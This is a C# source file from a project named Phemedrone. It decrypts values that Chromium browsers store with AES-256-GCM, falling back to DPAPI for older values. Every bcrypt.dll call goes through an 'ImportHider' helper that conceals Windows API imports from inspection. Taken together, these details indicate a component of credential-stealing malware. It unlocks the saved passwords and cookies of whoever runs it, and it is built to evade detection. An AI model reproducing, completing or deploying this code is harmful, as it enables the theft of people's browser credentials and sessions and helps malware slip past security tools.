using System;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using Phemedrone.Classes;
using Phemedrone.Extensions;

namespace Phemedrone.Cryptography
{
    public class AesGcm
    {
        // method to decrypt chromium encrypted values using aes-256-gcm
        // structure:
        // 0..11 bytes (length: 12) - vector
        // 12..(data.length-16) - encrypted data
        // (data.length-16).. - auth tag
        
        public static string DecryptValue(byte[] source, byte[] key)
        {
            if (Encoding.UTF8.GetString(source, 0, 2) != "v1")
            {
                var decoded = DpApi.Decrypt(source);
                return decoded == null ? string.Empty : Encoding.UTF8.GetString(decoded.ToArray());
            }

            if (key == null) return string.Empty;
            
            var iv = source.Skip(3).Take(12).ToArray();
            var authTag = source.Skip(source.Length - 16).ToArray();
            var encrypted = source.Skip(15).Take(source.Length - 15 - 16).ToArray();

            var decrypted = Decrypt(key, iv, encrypted, authTag);
            return decrypted == null ? string.Empty : Encoding.UTF8.GetString(decrypted);
        }
        
        private delegate uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
            [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation, uint dwFlags);
        
        private delegate uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);
        
        private delegate uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty,
            byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);
        
        private delegate uint BCryptSetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty,
            byte[] pbInput, int cbInput, int dwFlags);
        
        private delegate uint BCryptImportKey(IntPtr hAlgorithm, IntPtr hImportKey,
            [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject,
            byte[] pbInput, int cbInput, uint dwFlags);
        
        private delegate uint BCryptDestroyKey(IntPtr hKey);
        
        private delegate uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput,
            ref BCrypt.BcryptAuthenticatedCipherModeInfo pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput,
            int cbOutput, ref int pcbResult, int dwFlags);
        
        private static byte[] Decrypt(byte[] key, byte[] iv, byte[] cipherText, byte[] authTag)
        {
            var decryptDelegate =
                ImportHider.HiddenCallResolve<BCryptDecrypt>("bcrypt.dll", "BCryptDecrypt");
            var destroyKey =
                ImportHider.HiddenCallResolve<BCryptDestroyKey>("bcrypt.dll", "BCryptDestroyKey");
            var closeAlgorithm =
                ImportHider.HiddenCallResolve<BCryptCloseAlgorithmProvider>("bcrypt.dll",
                    "BCryptCloseAlgorithmProvider");
            
            var intPtr = OpenAlgorithmProvider("AES", "Microsoft Primitive Provider", "ChainingModeGCM");
            var hGlobal = ImportKey(intPtr, key, out var hKey);
            byte[] array2;
            BCrypt.BcryptAuthenticatedCipherModeInfo authInfo;
            using (authInfo = new BCrypt.BcryptAuthenticatedCipherModeInfo(iv, null, authTag))
            {
                var array = new byte[MaxAuthTagSize(intPtr)];
                var num = 0;
                var hResult = decryptDelegate(hKey, cipherText, cipherText.Length, ref authInfo, array, array.Length, null, 0, ref num, 0);
                if (hResult != 0) return null;
                array2 = new byte[num];
                hResult = decryptDelegate(hKey, cipherText, cipherText.Length, ref authInfo, array, array.Length, array2, array2.Length, ref num, 0);
                if (hResult == 3221266434U) return null; // authTag mismatch
                if (hResult != 0) return null;
            }
            destroyKey(hKey);
            Marshal.FreeHGlobal(hGlobal);
            closeAlgorithm(intPtr, 0U);
            return array2;
        }
        
        private static IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
        {
            var openAlgorithm =
                ImportHider.HiddenCallResolve<BCryptOpenAlgorithmProvider>("bcrypt.dll", "BCryptOpenAlgorithmProvider");
            var setProperty =
                ImportHider.HiddenCallResolve<BCryptSetProperty>("bcrypt.dll", "BCryptSetProperty");

            var result = openAlgorithm(out var ptr, alg, provider, 0U);
            if (result != 0) return ptr;
            var bytes = Encoding.Unicode.GetBytes(chainingMode);
            setProperty(ptr, "ChainingMode", bytes, bytes.Length, 0);
            return ptr;
        }
        
        private static int MaxAuthTagSize(IntPtr hAlg)
        {
            var property = GetProperty(hAlg, "AuthTagLength");
            return BitConverter.ToInt32(new[]
            {
                property[4],
                property[5],
                property[6],
                property[7]
            }, 0);
        }
        
        private static IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
        {
            var importKey =
                ImportHider.HiddenCallResolve<BCryptImportKey>("bcrypt.dll", "BCryptImportKey");
            
            var allocLength = BitConverter.ToInt32(GetProperty(hAlg, "ObjectLength"), 0);
            var allocPtr = Marshal.AllocHGlobal(allocLength);
            var array = Concat(BitConverter.GetBytes(1296188491), BitConverter.GetBytes(1), BitConverter.GetBytes(key.Length), key);
            var num2 = importKey(hAlg,
                IntPtr.Zero,
                "KeyDataBlob",
                out hKey,
                allocPtr,
                allocLength,
                array,
                array.Length,
                0U);
            return num2 != 0 ? IntPtr.Zero : allocPtr;
        }
        
        private static byte[] GetProperty(IntPtr hAlg, string name)
        {
            var getProperty =
                ImportHider.HiddenCallResolve<BCryptGetProperty>("bcrypt.dll", "BCryptGetProperty");
            
            var result = 0;
            var resultCode = getProperty(hAlg, name, null, 0, ref result, 0U);
            if (resultCode != 0) return null;
            var array = new byte[result];
            resultCode = getProperty(hAlg, name, array, array.Length, ref result, 0U);
            return resultCode != 0 ? null : array;
        }
        
        private static byte[] Concat(params byte[][] arrays)
        {
            var length = arrays.Select(a => a.Length).Sum();
            var array = new byte[length];
            var offset = 0;
            foreach (var arr in arrays)
            {
                if (arr == null) continue;
                Buffer.BlockCopy(arr, 0, array, offset, arr.Length);
                offset += arr.Length;
            }
            return array;
        }
    }
}